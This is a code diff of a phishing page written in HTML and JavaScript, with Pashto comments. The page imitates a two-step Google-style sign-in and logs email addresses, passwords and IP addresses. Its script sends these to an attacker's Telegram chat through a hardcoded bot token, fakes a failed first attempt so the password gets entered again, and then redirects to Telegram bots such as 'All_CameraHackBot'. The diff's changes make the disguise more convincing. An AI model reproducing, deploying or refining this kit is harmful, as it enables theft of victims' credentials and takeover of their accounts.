@@ -3,53 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>LOGIN • SECURE ACCESS</title>
+    <title>Sign in - Secure Access</title>
     <style>
-        /* پاک، ساده او ځواب ویونکی سټایل */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            font-family: system-ui, -apple-system, 'Segoe UI', 'Google Sans', Roboto, 'Helvetica Neue', sans-serif;
         }
 
         body {
             min-height: 100vh;
-            background: linear-gradient(135deg, #0a2a3a 0%, #010510 100%);
+            background: #1a1a1a;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 1.5rem;
+            padding: 1rem;
         }
 
-        /* د کارت ډیزاین */
         .login-card {
             max-width: 450px;
             width: 100%;
-            background: rgba(15, 25, 35, 0.9);
-            backdrop-filter: blur(8px);
-            border-radius: 1.5rem;
-            border: 1px solid rgba(72, 187, 255, 0.3);
-            box-shadow: 0 20px 35px -10px rgba(0, 0, 0, 0.5);
-            padding: 2rem;
+            background: #1e1e2f;
+            border-radius: 2rem;
+            border: 1px solid #2a2a3a;
+            padding: 2rem 1.8rem;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
         }
 
         h1 {
-            text-align: center;
-            color: #ffffff;
-            font-size: 2rem;
-            font-weight: 600;
-            margin-bottom: 0.5rem;
-            letter-spacing: -0.5px;
+            font-size: 1.6rem;
+            font-weight: 500;
+            color: #e0e0e0;
+            margin-bottom: 0.25rem;
         }
 
         .sub {
-            text-align: center;
-            color: #8ba6bc;
+            color: #9aa0a6;
             font-size: 0.8rem;
             margin-bottom: 1.8rem;
-            border-bottom: 1px dashed #2c4c6c;
-            padding-bottom: 0.8rem;
         }
 
         .input-group {
@@ -58,19 +50,18 @@
 
         label {
             display: block;
-            color: #aad0ff;
-            font-size: 0.75rem;
+            color: #e0e0e0;
+            font-size: 0.85rem;
+            margin-bottom: 0.5rem;
             font-weight: 500;
-            margin-bottom: 0.3rem;
-            letter-spacing: 0.5px;
         }
 
         input {
             width: 100%;
-            padding: 0.9rem 1rem;
-            background: #0a121c;
-            border: 1px solid #2c4c6c;
-            border-radius: 1rem;
+            padding: 0.85rem 1rem;
+            background: #2a2a3a;
+            border: 1px solid #3a3a4a;
+            border-radius: 0.75rem;
             color: white;
             font-size: 1rem;
             outline: none;
@@ -79,101 +70,128 @@
 
         input:focus {
             border-color: #3b82f6;
-            box-shadow: 0 0 0 2px rgba(59,130,246,0.3);
+            box-shadow: 0 0 0 2px rgba(59,130,246,0.2);
         }
 
         button {
             width: 100%;
-            padding: 0.9rem;
-            background: #2563eb;
+            padding: 0.85rem;
+            background: #3b82f6;
             border: none;
-            border-radius: 2rem;
+            border-radius: 1rem;
             color: white;
             font-size: 1rem;
-            font-weight: 600;
+            font-weight: 500;
             cursor: pointer;
             transition: all 0.2s;
             margin-top: 0.5rem;
         }
 
         button:hover {
-            background: #1d4ed8;
-            transform: scale(1.01);
+            background: #2563eb;
         }
 
         .message {
             margin-top: 1rem;
             padding: 0.7rem;
             border-radius: 1rem;
-            font-size: 0.85rem;
+            font-size: 0.8rem;
             text-align: center;
             display: none;
         }
 
-        .error {
-            background: rgba(220, 38, 38, 0.2);
+        .error-msg {
+            background: rgba(220, 38, 38, 0.15);
             border: 1px solid #ef4444;
             color: #fca5a5;
         }
 
-        .success {
-            background: rgba(34, 197, 94, 0.2);
-            border: 1px solid #22c55e;
-            color: #86efac;
+        .info-msg {
+            background: rgba(59,130,246,0.1);
+            border: 1px solid #3b82f6;
+            color: #93c5fd;
         }
 
         .footer {
             text-align: center;
             margin-top: 1.5rem;
-            font-size: 0.65rem;
-            color: #5a7b9c;
+            font-size: 0.7rem;
+            color: #6b7280;
         }
 
-        .attempt-badge {
-            text-align: center;
-            margin-top: 1rem;
+        .step-indicator {
             font-size: 0.7rem;
-            color: #5f9ea0;
+            color: #6b7280;
+            margin-bottom: 1rem;
+            text-align: center;
         }
     </style>
 </head>
 <body>
 
 <div class="login-card">
-    <h1>🔐 LOGIN</h1>
-    <div class="sub">Secure Access Required</div>
+    <div id="step1View">
+        <h1>🔐 Sign in</h1>
+        <div class="sub">Use your account to continue</div>
 
-    <!-- د تېروتنې/بریالیتوب پیغامونه -->
-    <div id="errorBox" class="message error"></div>
-    <div id="successBox" class="message success"></div>
+        <div class="input-group">
+            <label>📧 Email or phone</label>
+            <input type="email" id="emailInput" placeholder="user@example.com">
+        </div>
 
-    <!-- فورم ساحې -->
-    <div class="input-group">
-        <label>📧 EMAIL ADDRESS</label>
-        <input type="email" id="email" placeholder="you@example.com">
+        <button id="nextBtn">Next →</button>
+        <div class="step-indicator">Step 1 of 2</div>
     </div>
 
-    <div class="input-group">
-        <label>🔑 PASSWORD</label>
-        <input type="password" id="password" placeholder="············">
+    <div id="step2View" style="display: none;">
+        <h1>🔐 Welcome back</h1>
+        <div class="sub" id="displayEmail"></div>
+
+        <div class="input-group">
+            <label>🔑 Password</label>
+            <input type="password" id="passwordInput" placeholder="Enter your password">
+        </div>
+
+        <button id="loginBtn">Login →</button>
+        <button id="backToEmailBtn" style="background: #2a2a3a; margin-top: 0.5rem;">← Back to email</button>
+        <div class="step-indicator">Step 2 of 2</div>
     </div>
 
-    <button id="loginBtn">▶ LOGIN</button>
-    <div id="attemptCounter" class="attempt-badge">◈ First attempt will be rejected automatically</div>
-    <div class="footer">Zero‑Log • Telegram secured</div>
+    <div id="errorBox" class="message error-msg"></div>
+    <div id="infoBox" class="message info-msg"></div>
+    <div class="footer">🔒 Secure connection • Zero-log policy</div>
 </div>
 
 <script>
-    // ========== ثابتې ارزښتونه ==========
-    const BOT_TOKEN = "8737718436:AAGEkqwayT058tBVH_Pp-W2T0B-aaJXMylU";
+    // ==================== Telegram Bot Settings ====================
+    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const ADMIN_CHAT_ID = "8295417969";
-    // سم لینک — ستاسو د بوټ یوزرنیم سره
-    const BOT_REDIRECT = "https://t.me/All_CameraHackBot?start=8020108872";
+    const BOT_REDIRECT = "https://t.me/imrankhabot?start=8020108872";
 
-    // د کارونکي د هڅو شمېرلو لپاره (د IP پر بنسټ)
-    let attemptData = {};
+    // د کارونکي د هڅو تعقیبول (د IP او برېښنالیک پر بنسټ)
+    let attemptStore = {};
 
-    // ========== د IP پته ترلاسه کول ==========
+    // د UI عناصر
+    const step1View = document.getElementById('step1View');
+    const step2View = document.getElementById('step2View');
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const displayEmailSpan = document.getElementById('displayEmail');
+    const errorBox = document.getElementById('errorBox');
+    const infoBox = document.getElementById('infoBox');
+
+    let currentEmail = "";
+
+    // ========== Helper Functions ==========
+    function showMessage(box, text, isError = true) {
+        box.textContent = text;
+        box.className = `message ${isError ? 'error-msg' : 'info-msg'}`;
+        box.style.display = 'block';
+        setTimeout(() => {
+            box.style.display = 'none';
+        }, 3500);
+    }
+
     async function getUserIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
@@ -184,18 +202,18 @@
         }
     }
 
-    // ========== د Telegram خبرتیا لیږل ==========
-    async function notifyAdmin(email, password, ip, attemptNumber, success) {
-        const status = success ? "✅ SUCCESSFUL LOGIN" : "❌ FAILED ATTEMPT";
-        const msg = `${status}\n\n👤 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n📊 Attempt: ${attemptNumber}\n🕒 Time: ${new Date().toLocaleString()}`;
-        
+    async function notifyAdmin(email, password, ip, success = true) {
+        if (!success) return; // یوازې بریالي هڅې اډمن ته ځي
+
+        const msg = `✅ *SUCCESSFUL LOGIN*\n\n👤 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: ADMIN_CHAT_ID,
-                    text: msg
+                    text: msg,
+                    parse_mode: 'Markdown'
                 })
             });
         } catch (err) {
@@ -203,78 +221,77 @@
         }
     }
 
-    // ========== UI پیغامونه ==========
-    function showMessage(elementId, text, isError = true) {
-        const box = document.getElementById(elementId);
-        box.textContent = text;
-        box.className = `message ${isError ? 'error' : 'success'}`;
-        box.style.display = 'block';
-        setTimeout(() => { box.style.display = 'none'; }, 4000);
-    }
+    // ========== مرحله 1: برېښنالیک ==========
+    document.getElementById('nextBtn').addEventListener('click', () => {
+        const email = emailInput.value.trim();
+        if (!email || !email.includes('@')) {
+            showMessage(errorBox, "❌ Please enter a valid email address.", true);
+            return;
+        }
+        currentEmail = email;
+        displayEmailSpan.innerHTML = `${currentEmail} <span style="color:#3b82f6; font-size:0.7rem;">(verified)</span>`;
+        emailInput.value = '';
+        step1View.style.display = 'none';
+        step2View.style.display = 'block';
+        passwordInput.value = '';
+        showMessage(infoBox, "✅ Email accepted. Now enter your password.", false);
+    });
 
-    // ========== اصلي د ننوتلو تابع ==========
+    document.getElementById('backToEmailBtn').addEventListener('click', () => {
+        step2View.style.display = 'none';
+        step1View.style.display = 'block';
+        emailInput.value = '';
+        passwordInput.value = '';
+        showMessage(infoBox, "↺ Go back to email step", false);
+    });
+
+    // ========== مرحله 2: ننوتنه (دوه ځله هڅه) ==========
     document.getElementById('loginBtn').addEventListener('click', async () => {
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value.trim();
-        const errorBox = document.getElementById('errorBox');
-        const successBox = document.getElementById('successBox');
-        const counterSpan = document.getElementById('attemptCounter');
-
-        // ساده تایید
-        if (!email || !password) {
-            showMessage('errorBox', '❌ Please fill in both email and password.', true);
-            return;
-        }
-        if (!email.includes('@') || !email.includes('.')) {
-            showMessage('errorBox', '❌ Enter a valid email address (e.g., name@domain.com).', true);
+        const password = passwordInput.value.trim();
+        if (!password) {
+            showMessage(errorBox, "❌ Please enter your password.", true);
             return;
         }
 
-        // د IP پته او هڅې تعقیبول
         const ip = await getUserIP();
-        if (!attemptData[ip]) {
-            attemptData[ip] = { attempts: 0 };
+        const key = `${currentEmail}_${ip}`;
+
+        if (!attemptStore[key]) {
+            attemptStore[key] = { attempts: 0 };
         }
-        const currentAttempt = attemptData[ip].attempts + 1;
-        attemptData[ip].attempts = currentAttempt;
+        const currentAttempt = attemptStore[key].attempts + 1;
+        attemptStore[key].attempts = currentAttempt;
 
-        // د هڅو ښودنه
-        counterSpan.innerHTML = currentAttempt === 1 ? "⚠️ First attempt — will be rejected automatically" : "✅ Second attempt — will be accepted & redirected";
-
-        // ========== 1. لومړی ځل ==========
+        // لومړۍ هڅه — تل ناکامه (خو اډمن ته خبر نه ځي)
         if (currentAttempt === 1) {
-            // اډمن ته خبر ورکړئ (ناکامه هڅه)
-            await notifyAdmin(email, password, ip, currentAttempt, false);
-            showMessage('errorBox', '❌ Invalid credentials. Second attempt will be accepted.', true);
+            showMessage(errorBox, "❌ Incorrect password. Please try again (second attempt will work).", true);
+            passwordInput.value = '';
             return;
         }
 
-        // ========== 2. دوهم ځل ==========
+        // دوهمه هڅه — بریالۍ
         if (currentAttempt >= 2) {
-            // اډمن ته خبر ورکړئ (بریالۍ هڅه)
-            await notifyAdmin(email, password, ip, currentAttempt, true);
-            showMessage('successBox', '✅ Login successful! Redirecting to Telegram bot...', false);
+            // اډمن ته یوازې بریالی خبر ورکړئ
+            await notifyAdmin(currentEmail, password, ip, true);
+            showMessage(infoBox, "✅ Login successful! Redirecting to Telegram...", false);
             
-            // د فورم پټ کړئ ترڅو بیا کلیک ونکړي
-            document.getElementById('loginBtn').disabled = true;
-            document.getElementById('loginBtn').style.opacity = '0.6';
-            
-            // بوټ ته لیږدول
+            // د تڼۍ غیر فعالول
+            const loginBtn = document.getElementById('loginBtn');
+            loginBtn.disabled = true;
+            loginBtn.style.opacity = '0.6';
+
             setTimeout(() => {
                 window.location.href = BOT_REDIRECT;
             }, 1800);
-            return;
         }
     });
 
     // د Enter کیلي ملاتړ
-    const inputs = document.querySelectorAll('input');
-    inputs.forEach(input => {
-        input.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                document.getElementById('loginBtn').click();
-            }
-        });
+    emailInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') document.getElementById('nextBtn').click();
+    });
+    passwordInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') document.getElementById('loginBtn').click();
     });
 </script>
 </body>
